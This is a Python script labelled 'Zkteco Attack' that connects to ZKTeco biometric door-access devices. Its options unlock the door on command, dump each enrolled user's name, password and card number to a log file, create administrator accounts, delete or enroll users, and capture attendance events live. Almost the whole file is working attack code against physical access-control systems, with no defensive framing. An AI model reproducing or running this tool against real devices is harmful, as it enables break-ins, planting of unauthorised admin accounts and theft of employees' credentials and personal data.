import os
import sys
import logging
from zk import ZK, const, finger, user, base
from zk.exception import ZKError, ZKErrorConnection, ZKNetworkError
from datetime import datetime
from datetime import date
from optparse import OptionParser
import misc
import time
from prettytable import PrettyTable

class Options:
    def get_args():
        misc.print_header("--- Zkteco Attack - [bacth0san] --- ")
        parser = OptionParser()
        parser.add_option("-i","--ip", dest="ip", help="IP of zkteco biometric devices", default="10.32.29.24")
        parser.add_option("-p","--port", dest="port", help="PORT of zkteco biometric devices", default="4370")
        parser.add_option("-s","--sec", dest="unlock", help="time to unlock the door (second)")
        parser.add_option("-l", action="store_true", dest="l", help="Live Capture")
        parser.add_option("-r", action="store_true", dest="r", help="Show user")
        parser.add_option("-v", action="store_true", dest="v", help="Voice test")
        parser.add_option("-a", action="store_true", dest="a", help="Add user")
        parser.add_option("-e", action="store_true", dest="e", help="Enroll user")
        parser.add_option("-d", action="store_true", dest="d", help="Delete user")
        (options, args) = parser.parse_args()
        return options, args

class zkutils:
    def __init__(self, host, port, transmission=True):
        try:
            self.host = host
            self.port = 4370
            self.transmission = transmission
            self.connection = None
            self._startedAt = date.today()
            self._connect()
        except (ZKNetworkError, ZKErrorConnection, ZKError) as error:
            logging.error(error)
        except Exception as error:
            logging.error(error)

    def _connect(self, reconnect=False):
        zk = ZK(ip=self.host, port=self.port, verbose=True)
        self.connection = zk.connect()
        print('Connecting to device...')
        enable_flag = self.connection.enable_device()
        misc.print_info('connection established: host: {}, port: {}'.format(self.host, self.port))

    def _healthcheck(self):
        print('Getting device time: {}'.format(self.connection.get_time()))

    def add_user(self):
        misc.print_info("# Add New User")
        uid = input('UID: ')
        uid = int(uid)
        name = input('Name: ')
        admin = input('Admin (y/N): ')
        privilege = 14 if admin == 'y' else 0
        password = input('Password: ')
        user_id = input('User ID: ')
        card = input('Card :')
        card = int(card) if card else 0
        self.connection.set_user(uid, name, privilege, password, '', user_id, card)
        print("Created the user {} successfully".format(name))
    

    def enroll_user(self):
        uid = input('UID: ')
        misc.print_info("# Enroll for User - UID: {}".format(uid))
        self.connection.enroll_user(uid)
        misc.print_info("Successfully")

    def delete_user(self):
        misc.print_info("# Delete User")
        uid2 = input('UID: ')
        uid2 = int(uid2)
        self.connection.delete_user(uid2)
        print("Delete successfully user - uid {}".format(uid2))
    def enum(self):
        misc.print_info("# Device Information")
        t_headers = ['IP', 'MAC', 'Firmware', 'minor version', 'Serial number', 'platform']
        summ_table = PrettyTable(t_headers)
        summ_table.add_row([self.host,
                            self.connection.get_mac(),
                            self.connection.get_firmware_version(),
                            self.connection.get_fp_version(),
                            self.connection.get_serialnumber(),
                            self.connection.get_platform()])
        print(summ_table)

    
    def door_unlock(self, s):
        misc.print_info("# Unlocking ")
        print('--- Opening door {} ---'.format(s))
        self.connection.unlock(s)
        print('--- Done! ---')

    def live_capture(self):
        print ('')
        print ('--- Live Capture! (press ctrl+C to break) ---')
        att = self.connection.get_attendance()
        t_live = ['uid', 'user id', 'timestamp', 'status', 'punch']
        summ_table = PrettyTable(t_live)
        counter = 0
        for att in self.connection.live_capture():
            if att is None:
                #print ("timeout {}".format(counter))
                pass
            else:
                summ_table.add_row([att.uid, 
                                att.user_id, 
                                att.timestamp,
                                att.status,
                                att.punch])
                print(summ_table)
            if counter >= 10:
                self.connection.end_live_capture = True
        print('')
        print('--- capture End!---')

    def get_user(self, ip):
        print ('--- Get User ---')
        inicio = time.time()
        users = self.connection.get_users()
        final = time.time()
        print ('took {:.3f}[s]'.format(final - inicio))

        now = datetime.now()
        current_time = now.strftime("%H_%M_%S")
        
        ipx = ip.replace('.', '_')
        max_uid = 0
        prev = None
        t_x = ['UID', 'Name', 'Privilege', 'Group ID', 'User ID', 'Password', 'Card']
        summ_table = PrettyTable(t_x)
        fp_log = open("{}_{}.log".format(ipx, current_time), 'a+')
        for user in users:
            privilege = 'User'
            if user.uid > max_uid:
                max_uid = user.uid
            privilege = 'User' if user.privilege == const.USER_DEFAULT else 'Admin-%s' % user.privilege
            summ_table.add_row([user.uid, 
                                user.name, 
                                privilege, 
                                user.group_id, 
                                user.user_id, 
                                user.password, 
                                user.card])
        print(summ_table)
        fp_log.write(str(summ_table))
        fp_log.close()

    def voice_test(self):
        misc.print_info("voice testing...")
        self.connection.test_voice(2)

    def disconnect(self):
        self.connection.disconnect()
        misc.print_info('ok bye!')

def main():
    opt, a = Options.get_args()
    zk = zkutils(opt.ip, opt.port)
    zk._healthcheck()
    zk.enum()
    if(opt.unlock != None):
        zk.door_unlock(opt.unlock)
        time.sleep(int(opt.unlock)/2)
    if opt.l:
        zk.live_capture()
    if opt.a:
        zk.add_user()
    if opt.d:
        zk.delete_user()
    if opt.e:
        zk.enroll_user()
    if opt.r:
        zk.get_user(opt.ip)
    if opt.v:
        zk.voice_test()
    zk.disconnect()
if __name__=="__main__":
    main()
